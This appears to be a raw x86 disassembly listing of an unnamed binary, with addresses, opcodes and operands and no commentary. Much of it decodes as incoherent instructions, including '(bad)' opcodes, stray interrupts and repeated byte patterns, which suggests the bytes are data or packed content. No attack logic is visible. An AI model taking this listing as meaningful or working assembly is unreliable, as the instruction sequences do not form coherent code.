  4269c8:	mov    ebp,0x28f2d392
  4269cd:	push   ebx
  4269ce:	ror    edi,cl
  4269d0:	iret   
  4269d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4269d2:	inc    DWORD PTR [eax]
  4269d4:	add    BYTE PTR [edx],cl
  4269d6:	int3   
  4269d7:	push   es
  4269d8:	sbb    eax,0xcf0000ff
  4269dd:	jbe    0x426a04
  4269df:	mov    ebp,0xeff5
  4269e4:	int    0x8d
  4269e6:	xor    ch,cl
  4269e8:	xchg   esi,eax
  4269e9:	xor    BYTE PTR [ebx],bh
  4269eb:	psrlq  mm5,mm3
  4269ee:	xchg   edx,eax
  4269ef:	add    al,0xfb
  4269f1:	call   ebx
  4269f3:	jmp    0xcf05:0xa135328
  4269fa:	sbb    eax,0x610000ff
  4269ff:	sub    esi,DWORD PTR ds:0x6a5d8080
  426a05:	xor    eax,0xab88080
  426a0a:	push   es
  426a0b:	jo     0x426a0d
  426a0d:	add    BYTE PTR [eax],al
  426a0f:	iret   
  426a10:	mov    dh,BYTE PTR [eax]
  426a12:	mov    eax,0xb4cf0a
  426a17:	add    BYTE PTR [eax],al
  426a19:	pop    ebp
  426a1a:	adc    BYTE PTR ds:0xab88080,dh
  426a20:	push   es
  426a21:	bound  eax,QWORD PTR [eax]
  426a23:	add    BYTE PTR [eax],al
  426a25:	int    0xd2
  426a27:	mov    eax,0x94060a
  426a2c:	add    BYTE PTR [eax],al
  426a2e:	int    0xd3
  426a30:	mov    eax,0x98060a
  426a35:	add    BYTE PTR [eax],al
  426a37:	add    al,0x6d
  426a39:	sub    ch,cl
  426a3b:	jge    0x4269f5
  426a3d:	or     cl,bh
  426a3f:	mov    eax,0xcf000000
  426a44:	mov    ch,BYTE PTR [eax]
  426a46:	mov    eax,0xbccf0a
  426a4b:	add    BYTE PTR [eax],al
  426a4d:	add    al,0xd3
  426a4f:	pusha  
  426a50:	mov    eax,0xc0cf0a
  426a55:	add    BYTE PTR [eax],al
  426a57:	iret   
  426a58:	mov    cl,BYTE PTR [edx-0x48]
  426a5b:	or     cl,bh
  426a5d:	les    eax,FWORD PTR [eax]
  426a5f:	add    BYTE PTR [eax],al
  426a61:	int    0xf9
  426a63:	mov    eax,0x9c670a
  426a68:	add    BYTE PTR [eax],al
  426a6a:	iret   
  426a6b:	loopne 0x426a0d
  426a6d:	pop    edi
  426a6e:	add    BYTE PTR ds:0xab88080,dh
  426a74:	iret   
  426a75:	enter  0x0,0x0
  426a79:	iret   
  426a7a:	mov    bh,bh
  426a7c:	mov    eax,0x90cf0a
  426a81:	add    BYTE PTR [eax],al
  426a83:	mov    eax,0xa0670a
  426a88:	add    BYTE PTR [eax],al
  426a8a:	add    al,0xc9
  426a8c:	stc    
  426a8d:	mov    eax,0xa4670a
  426a92:	add    BYTE PTR [eax],al
  426a94:	int    0xf9
  426a96:	pop    edi
  426a97:	leave  
  426a98:	xor    eax,0xab88080
  426a9d:	iret   
  426a9e:	add    BYTE PTR [eax],0x0
  426aa1:	add    ch,cl
  426aa3:	jge    0x426a5d
  426aa5:	or     cl,bh
  426aa7:	aam    0x0
  426aa9:	add    BYTE PTR [eax],al
  426aab:	int    0xc5
  426aad:	mov    eax,0xe0060a
  426ab2:	add    BYTE PTR [eax],al
  426ab4:	cmp    ebp,DWORD PTR [ebp-0x48]
  426ab7:	or     ah,BYTE PTR [edi-0x58]
  426aba:	add    BYTE PTR [eax],al
  426abc:	add    bh,cl
  426abe:	addr16 in al,0x0
  426ac1:	add    BYTE PTR [eax],al
  426ac3:	leave  
  426ac4:	push   es
  426ac5:	lods   al,BYTE PTR ds:[esi]
  426ac6:	add    BYTE PTR [eax],al
  426ac8:	add    dh,ah
  426aca:	xor    eax,0x6c9352b
  426acf:	fadd   DWORD PTR [eax]
  426ad1:	add    BYTE PTR [eax],al
  426ad3:	jae    0x426b0a
  426ad5:	jno    0x426b0c
  426ad7:	mov    eax,0x3076cdaf
  426adc:	int    0x8d
  426ade:	xor    ch,cl
  426ae0:	xchg   esi,eax
  426ae1:	xor    BYTE PTR [edx+eax*1],al
  426ae4:	call   ebx
  426ae6:	repnz sub BYTE PTR [ebx],bh
  426ae9:	jns    0x426abe
  426aeb:	mov    ebp,0xcdd35392
  426af0:	lea    esi,[eax]
  426af2:	add    al,0x2
  426af4:	(bad)  
  426af5:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426afb:	repz xchg edx,eax
  426afd:	push   ebx
  426afe:	jecxz  0x426b3b
  426b00:	retf   
  426b01:	add    al,0xd2
  426b03:	sbb    bl,BYTE PTR [ebx]
  426b05:	retf   
  426b06:	cmp    eax,DWORD PTR [eax]
  426b08:	inc    ebx
  426b09:	cli    
  426b0a:	das    
  426b0b:	or     cl,dl
  426b0d:	add    BYTE PTR [eax+0x43888280],0xd2
  426b14:	das    
  426b15:	add    al,0x37
  426b17:	add    BYTE PTR [eax+0x308dcd80],0xcd
  426b1e:	xchg   esi,eax
  426b1f:	xor    BYTE PTR [ebx],bh
  426b21:	psrlq  mm5,mm3
  426b24:	xchg   edx,eax
  426b25:	add    al,0xfb
  426b27:	call   ebx
  426b29:	jmp    0xcd7d:0x87135328
  426b30:	aad    0xb8
  426b32:	cmp    edx,DWORD PTR ds:0x708d
  426b38:	add    ch,cl
  426b3a:	lea    esi,[eax]
  426b3c:	int    0xe6
  426b3e:	xor    BYTE PTR [ebx],bh
  426b40:	psrlq  mm5,mm3
  426b43:	xchg   edx,eax
  426b44:	add    al,0xf8
  426b46:	call   ebx
  426b48:	jmp    0x8832be75
  426b4d:	jge    0x426b07
  426b4f:	int    0xcc
  426b51:	lea    esi,[eax+0x0]
  426b54:	add    BYTE PTR [eax],al
  426b56:	mov    eax,0xd3b8e3f8
  426b5b:	repnz das 
  426b5d:	mov    eax,0x53b8f3e3
  426b62:	jecxz  0x426b31
  426b64:	lea    esi,[eax]
  426b66:	int    0xe6
  426b68:	xor    BYTE PTR [ebx],bh
  426b6a:	psrlq  mm5,mm3
  426b6d:	xchg   edx,eax
  426b6e:	add    al,0xf8
  426b70:	call   ebx
  426b72:	jmp    0x8832be9f
  426b77:	jge    0x426b31
  426b79:	or     dl,BYTE PTR ds:0x708d
  426b7f:	add    ch,cl
  426b81:	lea    esi,[eax]
  426b83:	int    0x96
  426b85:	xor    BYTE PTR [ebx],bh
  426b87:	(bad)  
  426b89:	sti    
  426b8a:	call   ebx
  426b8c:	jmp    0x426b20
  426b8e:	shr    edx,cl
  426b90:	sub    BYTE PTR [ebx+0x13],dl
  426b93:	int    0x96
  426b95:	xor    BYTE PTR [edi+0x308dcdd3],al
  426b9b:	add    al,0x2
  426b9d:	(bad)  
  426b9e:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426ba4:	repz xchg edx,eax
  426ba6:	push   ebx
  426ba7:	jecxz  0x426be4
  426ba9:	retf   
  426baa:	add    al,0xd2
  426bac:	sbb    bl,BYTE PTR [ebx]
  426bae:	retf   
  426baf:	cmp    eax,DWORD PTR [eax]
  426bb1:	inc    ebx
  426bb2:	cli    
  426bb3:	das    
  426bb4:	or     ebp,DWORD PTR [esi+0x2f000000]
  426bba:	pop    es
  426bbb:	pop    ebx
  426bbc:	add    BYTE PTR [eax],al
  426bbe:	add    bl,al
  426bc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426bc1:	mov    esi,0x76cf4229
  426bc6:	jne    0x426bd2
  426bc8:	jbe    0x426b52
  426bca:	int    0x76
  426bcc:	mov    BYTE PTR [edi+0x13de37b6],bh
  426bd2:	or     bl,BYTE PTR [ecx+ecx*8]
  426bd5:	ins    BYTE PTR es:[edi],dx
  426bd6:	test   BYTE PTR [ebp-0x32dadcf6],bh
  426bdc:	jbe    0x426c53
  426bde:	int    0x8d
  426be0:	jge    0x426c11
  426be2:	inc    ebp
  426be3:	jge    0x426b77
  426be5:	shr    ebx,cl
  426be7:	xchg   edx,eax
  426be8:	int    0x8d
  426bea:	jne    0x426bb9
  426bec:	xchg   esi,eax
  426bed:	jge    0x426c2a
  426bef:	leave  
  426bf0:	cmp    ebx,edx
  426bf2:	push   ebx
  426bf3:	icebp  
  426bf4:	int    0x76
  426bf6:	cmc    
  426bf7:	bound  eax,QWORD PTR [ebp-0x7f7f7edb]
  426bfd:	jo     0x426bce
  426bff:	push   es
  426c00:	cmc    
  426c01:	inc    DWORD PTR [eax]
  426c03:	add    BYTE PTR [eax-0x2d],dh
  426c06:	repnz sub BYTE PTR [ebp+0xf2a3],bh
  426c0d:	int    0x76
  426c0f:	in     eax,dx
  426c10:	int    0x8d
  426c12:	adc    DWORD PTR [edi],ebp
  426c14:	inc    ebp
  426c15:	jge    0x426ba9
  426c17:	shr    ebx,cl
  426c19:	xchg   edx,eax
  426c1a:	int    0x8d
  426c1c:	in     eax,dx
  426c1d:	int    0x96
  426c1f:	adc    ebx,edx
  426c21:	repnz sub ch,cl
  426c24:	iret   
  426c25:	cmc    
  426c26:	inc    DWORD PTR [eax]
  426c28:	add    ch,cl
  426c2a:	mov    DWORD PTR [ebx],edi
  426c2c:	leave  
  426c2d:	cmp    ebx,edx
  426c2f:	push   ebx
  426c30:	rol    BYTE PTR [ebx+0x7d],cl
  426c33:	das    
  426c34:	push   es
  426c35:	push   ebp
  426c36:	add    BYTE PTR [eax-0xa293280],0xc9
  426c3d:	jbe    0x426c4c
  426c3f:	(bad)  
  426c40:	ficom  WORD PTR ss:[ebx]
  426c43:	pop    ebp
  426c44:	mov    ebp,0xa25230a
  426c49:	jbe    0x426c3c
  426c4b:	or     ah,BYTE PTR [esi-0x6289f56b]
  426c51:	int    0x76
  426c53:	xchg   ebp,eax
  426c54:	int    0x8d
  426c56:	popf   
  426c57:	das    
  426c58:	inc    ebp
  426c59:	jge    0x426bed
  426c5b:	shr    ebx,cl
  426c5d:	xchg   edx,eax
  426c5e:	int    0x8d
  426c60:	xchg   ebp,eax
  426c61:	int    0x96
  426c63:	popf   
  426c64:	cmp    ecx,ecx
  426c66:	cmp    ebx,edx
  426c68:	push   ebx
  426c69:	icebp  
  426c6a:	bound  eax,QWORD PTR [eax]
  426c6c:	(bad)  
  426c6d:	xor    al,0xd3
  426c6f:	repnz sub BYTE PTR [eax],al
  426c72:	pop    ecx
  426c73:	xor    eax,0xbd808081
  426c78:	push   eax
  426c79:	repnz add BYTE PTR [eax],al
  426c7c:	int    0x76
  426c7e:	xchg   ebp,eax
  426c7f:	int    0x8d
  426c81:	popf   
  426c82:	das    
  426c83:	inc    ebp
  426c84:	jge    0x426c18
  426c86:	shr    ebx,cl
  426c88:	xchg   edx,eax
  426c89:	int    0x8d
  426c8b:	xchg   ebp,eax
  426c8c:	int    0x96
  426c8e:	popf   
  426c8f:	cmp    ecx,ecx
  426c91:	cmp    ebx,edx
  426c93:	push   ebx
  426c94:	icebp  
  426c95:	bound  eax,QWORD PTR [eax]
  426c97:	pop    ecx
  426c98:	xor    eax,0xd3808081
  426c9d:	repnz sub BYTE PTR [eax],al
  426ca0:	pop    ecx
  426ca1:	sub    eax,0xbd808081
  426ca6:	xchg   edx,eax
  426ca7:	repnz add BYTE PTR [eax],al
  426caa:	int    0x7
  426cac:	xor    eax,0xcd808081
  426cb1:	mov    ch,cl
  426cb3:	jle    0x426d19
  426cb5:	xchg   DWORD PTR [eax-0x327772f6],ecx
  426cbb:	lea    ecx,ds:0x2ff176cd
  426cc1:	inc    ebp
  426cc2:	rcl    DWORD PTR [edx-0x326d422d],cl
  426cc8:	jbe    0x426cd7
  426cca:	int    0x96
  426ccc:	icebp  
  426ccd:	cmp    esi,eax
  426ccf:	shr    DWORD PTR [ebp+0x536d3b28],cl
  426cd5:	ror    ebp,cl
  426cd7:	lea    ecx,[eax+0x187ebb2f]
  426cdd:	push   es
  426cde:	jge    0x426cb4
  426ce0:	dec    esp
  426ce1:	int    0x7
  426ce3:	popf   
  426ce4:	add    DWORD PTR [eax+0x4180c980],0xcd358621
  426cee:	jbe    0x426d3c
  426cf0:	int    0x76
  426cf2:	xor    BYTE PTR [eax],al
  426cf4:	(bad)  
  426cf5:	cmp    al,0x0
  426cf7:	(bad)  
  426cf8:	cmc    
  426cf9:	add    dh,dl
  426cfb:	sub    al,0x0
  426cfd:	(bad)  
  426cfe:	and    al,0x0
  426d00:	(bad)  
  426d01:	sbb    al,0x0
  426d03:	(bad)  
  426d04:	adc    al,0xbd
  426d06:	test   ch,dh
  426d08:	add    BYTE PTR [eax],al
  426d0a:	or     al,BYTE PTR [esi]
  426d0c:	adc    edi,edi
  426d0e:	add    BYTE PTR [eax],al
  426d10:	int    0x76
  426d12:	cmp    al,0x4
  426d14:	fcom   QWORD PTR [eax+eax*4]
  426d17:	aam    0x1a
  426d19:	int    0x76
  426d1b:	cmp    al,0x4
  426d1d:	fsub   QWORD PTR [eax+eax*4]
  426d20:	aam    0x4e
  426d22:	int    0x6
  426d24:	adc    edi,edi
  426d26:	add    BYTE PTR [eax],al
  426d28:	int    0x8d
  426d2a:	cmp    al,0xa
  426d2c:	outs   dx,BYTE PTR ds:[esi]
  426d2d:	sbb    al,0xec
  426d2f:	push   ebx
  426d30:	add    dh,dl
  426d32:	cmp    al,0x0
  426d34:	(bad)  
  426d35:	cmc    
  426d36:	mov    ebp,0x6daa
  426d3b:	stos   BYTE PTR es:[edi],al
  426d3c:	test   al,0x63
  426d3e:	retf   
  426d3f:	shl    BYTE PTR [eax+eax*4],cl
  426d42:	xchg   esi,eax
  426d43:	int    0xed
  426d45:	jno    0x426db8
  426d47:	cwde   
  426d48:	leave  
  426d49:	jbe    0x426d48
  426d4b:	dec    ecx
  426d4c:	and    DWORD PTR [esi-0x68936cb],eax
  426d52:	inc    ecx
  426d53:	and    DWORD PTR [esi-0x28932cb],eax
  426d59:	int    0xd6
  426d5b:	std    
  426d5c:	sar    bh,0x5f
  426d5f:	shl    DWORD PTR [ecx],1
  426d61:	xchg   BYTE PTR ds:0x3ba0d33b,dh
  426d67:	sti    
  426d68:	sar    DWORD PTR [ebp+0x28b9d392],cl
  426d6e:	push   ebx
  426d6f:	jns    0x426d3e
  426d71:	(bad)  
  426d72:	mov    BYTE PTR [ebx+0x11],al
  426d75:	int    0x76
  426d77:	std    
  426d78:	aam    0xc4
  426d7a:	int    0xd6
  426d7c:	std    
  426d7d:	cmp    edx,ebx
  426d7f:	cmp    edi,ebx
  426d81:	sar    DWORD PTR [ecx-0x6d422cd8],cl
  426d87:	push   ebx
  426d88:	jns    0x426d57
  426d8a:	(bad)  
  426d8b:	dec    esp
  426d8c:	inc    ebx
  426d8d:	adc    esp,edx
  426d8f:	pop    ebx
  426d90:	int    0x96
  426d92:	xor    BYTE PTR [edx-0x32b31933],bl
  426d98:	jbe    0x426d22
  426d9a:	cmp    esi,edi
  426d9c:	push   es
  426d9d:	add    ah,dl
  426d9f:	push   esi
  426da0:	pop    ebx
  426da1:	retf   0x8624
  426da4:	or     DWORD PTR [esi-0x59a6d0d1],esp
  426daa:	das    
  426dab:	push   es
  426dac:	fcmovbe st,st(6)
  426dae:	dec    esi
  426daf:	add    al,0xf4
  426db1:	adc    DWORD PTR [edx],0xffffffc5
  426db4:	fwait
  426db5:	add    BYTE PTR [eax+0x2fa60980],0xec
  426dbc:	dec    esp
  426dbd:	adc    ch,ah
  426dbf:	in     eax,dx
  426dc0:	add    BYTE PTR [eax+0x2fa60980],0xf1
  426dc7:	lea    ebp,[edi]
  426dc9:	retf   0x2fa6
  426dcc:	or     DWORD PTR [esi+eax*4],esp
  426dcf:	js     0x426e14
  426dd1:	clc    
  426dd2:	or     BYTE PTR [esi],0x63
  426dd5:	int    0x76
  426dd7:	stc    
  426dd8:	cmp    edx,ebx
  426dda:	int    0x8d
  426ddc:	stc    
  426ddd:	add    al,0x2
  426ddf:	jmp    FWORD PTR [edx+0x76cd4aec]
  426de5:	std    
  426de6:	cmp    edx,ebx
  426de8:	int    0x8d
  426dea:	std    
  426deb:	cmp    edx,DWORD PTR [ebx]
  426ded:	shl    edx,cl
  426def:	sub    bl,dl
  426df1:	mov    ebp,0xa8d35392
  426df6:	retf   
  426df7:	ror    BYTE PTR [eax+eax*4-0x6a],cl
  426dfb:	int    0xed
  426dfd:	add    al,0xed
  426dff:	(bad)  
  426e00:	leave  
  426e01:	jbe    0x426e00
  426e03:	dec    ecx
  426e04:	and    DWORD PTR [esi+0x21416135],eax
  426e0a:	xchg   BYTE PTR ds:0xcdf9960a,dh
  426e10:	jbe    0x426e26
  426e12:	or     dh,BYTE PTR [esi+0x14]
  426e15:	int    0x76
  426e17:	adc    al,0xcd
  426e19:	add    DWORD PTR ds:0xcd808081,ebp
  426e1f:	lea    edx,[ecx*8+0x2d0acd80]
  426e26:	add    DWORD PTR [eax-0x78763280],0xa5b647c
  426e30:	lea    esi,[ebp-0x32028933]
  426e36:	(bad)  
  426e37:	std    
  426e38:	cwde   
  426e39:	call   0x3b85:0x82cfffc0
  426e40:	jns    0x426e15
  426e42:	mov    ebp,0xf03baa92
  426e47:	shl    edx,cl
  426e49:	sub    BYTE PTR [ebx-0x2d],dl
  426e4c:	or     dh,BYTE PTR [esi-0x63]
  426e4f:	int    0x76
  426e51:	std    
  426e52:	int    0x8d
  426e54:	std    
  426e55:	cmp    edi,DWORD PTR [ecx-0x2d]
  426e58:	mov    ebp,0xd3f03b92
  426e5d:	repnz sub BYTE PTR [ebx-0x2d],dl
  426e61:	or     dh,BYTE PTR [esi-0x53]
  426e64:	int    0x76
  426e66:	mov    ch,0xcd
  426e68:	ins    BYTE PTR es:[edi],dx
  426e69:	jo     0x426e6f
  426e6b:	mov    ebp,0xf1760a4c
  426e70:	int    0x76
  426e72:	mov    ch,0xcd
  426e74:	ins    BYTE PTR es:[edi],dx
  426e75:	pop    esp
  426e76:	int    0x8d
  426e78:	mov    ch,0x7c
  426e7a:	push   es
  426e7b:	outs   dx,BYTE PTR ds:[esi]
  426e7c:	xchg   esp,eax
  426e7d:	int    0x76
  426e7f:	mov    ch,0xd4
  426e81:	sbb    al,0xcd
  426e83:	ins    BYTE PTR es:[edi],dx
  426e84:	pop    esp
  426e85:	int    0x8d
  426e87:	mov    ch,0xcd
  426e89:	jle    0x426e1f
  426e8b:	jl     0x426e85
  426e8d:	icebp  
  426e8e:	sub    edi,DWORD PTR [ebp-0x33]
  426e91:	jbe    0x426e48
  426e93:	int    0x6c
  426e95:	pop    esp
  426e96:	xchg   ebx,edx
  426e98:	in     al,dx
  426e99:	xchg   ebp,ecx
  426e9b:	ins    BYTE PTR es:[edi],dx
  426e9c:	xchg   esp,eax
  426e9d:	or     dh,BYTE PTR [esi-0x43]
  426ea0:	int    0x76
  426ea2:	std    
  426ea3:	int    0x8d
  426ea5:	std    
  426ea6:	cmp    edi,DWORD PTR [ecx+0x3b]
  426ea9:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426eb0:	push   ebx
  426eb1:	ror    DWORD PTR [edx],cl
  426eb3:	jbe    0x426ec9
  426eb5:	int    0x76
  426eb7:	std    
  426eb8:	int    0x8d
  426eba:	std    
  426ebb:	cmp    edi,DWORD PTR [ecx+0x3b]
  426ebe:	lock shl edx,cl
  426ec1:	sub    bl,dl
  426ec3:	mov    ebp,0xad35392
  426ec8:	jbe    0x426ede
  426eca:	int    0x76
  426ecc:	std    
  426ecd:	int    0x8d
  426ecf:	std    
  426ed0:	cmp    esi,eax
  426ed2:	cmp    edi,DWORD PTR [ecx-0x2d]
  426ed5:	repnz sub bl,dl
  426ed8:	mov    ebp,0xcdd35392
  426edd:	lea    esi,[eax]
  426edf:	or     al,BYTE PTR [ecx-0x36eb69f6]
  426ee5:	jbe    0x426efb
  426ee7:	cmp    DWORD PTR [ecx],esp
  426ee9:	xchg   BYTE PTR ds:0xb21476c9,dh
  426eef:	and    DWORD PTR [esi+0x1476c935],eax
  426ef5:	imul   esp,DWORD PTR [ecx],0x36eb3586
  426efb:	xchg   BYTE PTR [eax-0x2893280],al
  426f01:	int    0x8d
  426f03:	std    
  426f04:	cmp    edi,DWORD PTR [ecx+0x3b]
  426f07:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426f0e:	push   ebx
  426f0f:	ror    DWORD PTR [edx],cl
  426f11:	jbe    0x426ec0
  426f13:	int    0x76
  426f15:	mov    ebp,0xa4c7687
  426f1a:	jbe    0x426eb9
  426f1c:	add    dh,dl
  426f1e:	popf   
  426f1f:	add    dh,dl
  426f21:	dec    esp
  426f22:	int    0x8d
  426f24:	mov    ch,0xbd
  426f26:	neg    bh
  426f28:	add    BYTE PTR [eax],al
  426f2a:	or     dh,BYTE PTR [esi+0x14]
  426f2d:	int    0x76
  426f2f:	adc    al,0x6
  426f31:	ins    DWORD PTR es:[edi],dx
  426f32:	aam    0x60
  426f34:	int    0x76
  426f36:	popf   
  426f37:	or     dh,BYTE PTR [esi-0x5b]
  426f3a:	int    0x76
  426f3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f3d:	int    0x8d
  426f3f:	dec    esp
  426f40:	xor    edx,ebx
  426f42:	or     dh,BYTE PTR [esi-0x5b]
  426f45:	int    0x76
  426f47:	adc    al,0xcd
  426f49:	lea    edx,[ecx*8+0x6e87306c]
  426f50:	dec    esp
  426f51:	int    0x8d
  426f53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f54:	inc    ebx
  426f55:	jge    0x426ed9
  426f57:	sbb    ch,cl
  426f59:	jbe    0x426f6f
  426f5b:	int    0x6c
  426f5d:	dec    esp
  426f5e:	int    0x8d
  426f60:	adc    al,0x87
  426f62:	outs   dx,BYTE PTR ds:[esi]
  426f63:	mov    ch,cl
  426f65:	lea    esp,[ebp-0x2e142ccd]
  426f6b:	test   DWORD PTR [eax+0x2149bf80],eax
  426f71:	xchg   BYTE PTR ds:0xc90da60a,dh
  426f77:	jbe    0x426ff6
  426f79:	inc    ecx
  426f7a:	and    DWORD PTR [esi+0x7576c935],eax
  426f80:	cmp    DWORD PTR [ecx],esp
  426f82:	xchg   BYTE PTR ds:0xb26d76c9,dh
  426f88:	and    DWORD PTR [esi+0xd76cf35],eax
  426f8e:	or     dh,BYTE PTR [esi-0xb]
  426f91:	iret   
  426f92:	jbe    0x427011
  426f94:	or     dh,BYTE PTR [esi+0x11]
  426f97:	iret   
  426f98:	jbe    0x42700f
  426f9a:	or     dh,BYTE PTR [esi+0x14]
  426f9d:	iret   
  426f9e:	jbe    0x42700d
  426fa0:	or     dh,BYTE PTR [esi-0x13]
  426fa3:	int    0x76
  426fa5:	std    
  426fa6:	int    0x8d
  426fa8:	std    
  426fa9:	cmp    edi,DWORD PTR [ecx+0x3b]
  426fac:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426fb3:	push   ebx
  426fb4:	ror    DWORD PTR [edx],cl
  426fb6:	jbe    0x426f5d
  426fb8:	jmp    0x426fcd
  426fba:	xchg   DWORD PTR [eax-0x4d03ed80],eax
  426fc0:	and    DWORD PTR [esi-0x22fad0cb],eax
  426fc6:	xchg   DWORD PTR [eax+0x4cc080],eax
  426fcc:	(bad)  
  426fcd:	popf   
  426fce:	iret   
  426fcf:	jbe    0x426fa1
  426fd1:	jo     0x426f90
  426fd3:	xlat   BYTE PTR ds:[ebx]
  426fd4:	fild   WORD PTR [eax]
  426fd6:	add    ch,cl
  426fd8:	jbe    0x426fd3
  426fda:	int    0x8d
  426fdc:	stc    
  426fdd:	cmp    edi,DWORD PTR [ecx+0x3b]
  426fe0:	lock shl edx,cl
  426fe3:	sub    bl,dl
  426fe5:	mov    ebp,0xad35392
  426fea:	jbe    0x426f99
  426fec:	or     ah,BYTE PTR [esi-0x6a29ae6b]
  426ff2:	int    0x76
  426ff4:	xchg   ebp,eax
  426ff5:	sar    DWORD PTR [ebp-0x2c1ec46e],cl
  426ffb:	in     eax,0x28
  426ffd:	push   ebx
  426ffe:	popf   
  426fff:	or     ah,BYTE PTR [esi-0x689325b]
  427005:	int    0x8d
  427007:	stc    
  427008:	cmp    esi,eax
  42700a:	shl    edx,cl
  42700c:	sub    BYTE PTR [ebx],bh
  42700e:	jns    0x426fe3
  427010:	mov    ebp,0xcdd35392
  427015:	(bad)  
  427016:	stc    
  427017:	int    0x96
  427019:	stc    
  42701a:	cmp    ecx,DWORD PTR [edi]
  42701c:	cmp    ebx,ecx
  42701e:	shr    ebx,cl
  427020:	xchg   edx,eax
  427021:	shr    edx,cl
  427023:	sub    BYTE PTR [ebx+0x13],dl
  427026:	xchg   ebx,edx
  427028:	int    0x8d
  42702a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42702b:	or     ah,BYTE PTR [esi-0x2982bc9b]
  427031:	sub    ch,cl
  427033:	jbe    0x42702e
  427035:	int    0x8d
  427037:	stc    
  427038:	cmp    edi,DWORD PTR [ecx+0x3b]
  42703b:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427042:	push   ebx
  427043:	shl    DWORD PTR [eax-0x40],cl
  427046:	dec    esp
  427047:	iret   
  427048:	jbe    0x42701a
  42704a:	jo     0x427009
  42704c:	sti    
  42704d:	std    
  42704e:	add    BYTE PTR [eax],al
  427050:	int    0x76
  427052:	std    
  427053:	int    0x8d
  427055:	std    
  427056:	cmp    edi,DWORD PTR [ecx+0x3b]
  427059:	lock shl edx,cl
  42705c:	sub    bl,dl
  42705e:	mov    ebp,0xcdd35392
  427063:	lea    esp,[ebp+0x28d47d43]
  427069:	int    0x76
  42706b:	std    
  42706c:	int    0x8d
  42706e:	std    
  42706f:	cmp    edi,DWORD PTR [ecx+0x3b]
  427072:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427079:	push   ebx
  42707a:	shl    DWORD PTR [eax-0x40],cl
  42707d:	dec    esp
  42707e:	iret   
  42707f:	jbe    0x427051
  427081:	jo     0x427040
  427083:	mov    edi,0xcd0000fd
  427088:	jbe    0x42707f
  42708a:	int    0x8d
  42708c:	cmc    
  42708d:	int    0x89
  42708f:	int    0x80
  427091:	cmp    esi,eax
  427093:	cmp    edi,DWORD PTR [ecx-0x2d]
  427096:	repnz sub bl,dl
  427099:	mov    ebp,0xcad35392
  42709e:	je     0x427025
  4270a0:	ror    ch,1
  4270a2:	(bad)  
  4270a3:	std    
  4270a4:	int    0x96
  4270a6:	std    
  4270a7:	cmp    ecx,DWORD PTR [edi]
  4270a9:	cmp    ebx,ecx
  4270ab:	shr    ebx,cl
  4270ad:	xchg   edx,eax
  4270ae:	shr    edx,cl
  4270b0:	sub    BYTE PTR [edi],ch
  4270b2:	pop    ecx
  4270b3:	ins    DWORD PTR es:[edi],dx
  4270b4:	push   ebx
  4270b5:	adc    eax,DWORD PTR [ebx-0x2d]
  4270b8:	das    
  4270b9:	add    eax,0x80809212
  4270be:	int    0x76
  4270c0:	adc    ebp,ecx
  4270c2:	lea    edx,[ecx]
  4270c4:	int    0x89
  4270c6:	int    0x80
  4270c8:	cmp    esi,eax
  4270ca:	cmp    edi,DWORD PTR [ecx-0x2d]
  4270cd:	repnz sub bl,dl
  4270d0:	mov    ebp,0xcad35392
  4270d5:	je     0x42705c
  4270d7:	ror    ch,1
  4270d9:	(bad)  
  4270da:	std    
  4270db:	int    0x96
  4270dd:	std    
  4270de:	cmp    ecx,DWORD PTR [edi]
  4270e0:	cmp    ebx,ecx
  4270e2:	shr    ebx,cl
  4270e4:	xchg   edx,eax
  4270e5:	shr    edx,cl
  4270e7:	sub    BYTE PTR [edi],ch
  4270e9:	pop    ecx
  4270ea:	ins    DWORD PTR es:[edi],dx
  4270eb:	push   ebx
  4270ec:	adc    eax,DWORD PTR [ebx-0x2d]
  4270ef:	das    
  4270f0:	add    eax,0x8080928a
  4270f5:	int    0x76
  4270f7:	adc    al,0xcd
  4270f9:	lea    edx,[ecx*8+0x3b80cd89]
  427100:	lock cmp edi,DWORD PTR [ecx-0x2d]
  427104:	repnz sub bl,dl
  427107:	mov    ebp,0xcad35392
  42710c:	je     0x427093
  42710e:	ror    ch,1
  427110:	(bad)  
  427111:	std    
  427112:	int    0x96
  427114:	std    
  427115:	cmp    ecx,DWORD PTR [edi]
  427117:	cmp    ebx,ecx
  427119:	shr    ebx,cl
  42711b:	xchg   edx,eax
  42711c:	shr    edx,cl
  42711e:	sub    BYTE PTR [edi],ch
  427120:	pop    ecx
  427121:	ins    DWORD PTR es:[edi],dx
  427122:	push   ebx
  427123:	adc    eax,DWORD PTR [ebx-0x2d]
  427126:	das    
  427127:	add    eax,0x8080921b
  42712c:	int    0x76
  42712e:	in     eax,dx
  42712f:	int    0x8d
  427131:	in     eax,dx
  427132:	int    0x89
  427134:	int    0x80
  427136:	cmp    esi,eax
  427138:	cmp    edi,DWORD PTR [ecx-0x2d]
  42713b:	repnz sub bl,dl
  42713e:	mov    ebp,0xcad35392
  427143:	je     0x4270ca
  427145:	ror    ch,1
  427147:	(bad)  
  427148:	std    
  427149:	int    0x96
  42714b:	std    
  42714c:	cmp    ecx,DWORD PTR [edi]
  42714e:	cmp    ebx,ecx
  427150:	shr    ebx,cl
  427152:	xchg   edx,eax
  427153:	shr    edx,cl
  427155:	sub    BYTE PTR [edi],ch
  427157:	pop    ecx
  427158:	ins    DWORD PTR es:[edi],dx
  427159:	push   ebx
  42715a:	adc    eax,DWORD PTR [ebx-0x2d]
  42715d:	das    
  42715e:	add    eax,0x808081a5
  427163:	int    0x76
  427165:	adc    ebp,ecx
  427167:	lea    edx,[ecx]
  427169:	int    0x89
  42716b:	int    0x80
  42716d:	cmp    esi,eax
  42716f:	shl    edx,cl
  427171:	sub    BYTE PTR [ebx],bh
  427173:	jns    0x427148
  427175:	mov    ebp,0xcad35392
  42717a:	je     0x427101
  42717c:	ror    ch,1
  42717e:	(bad)  
  42717f:	cmc    
  427180:	int    0x89
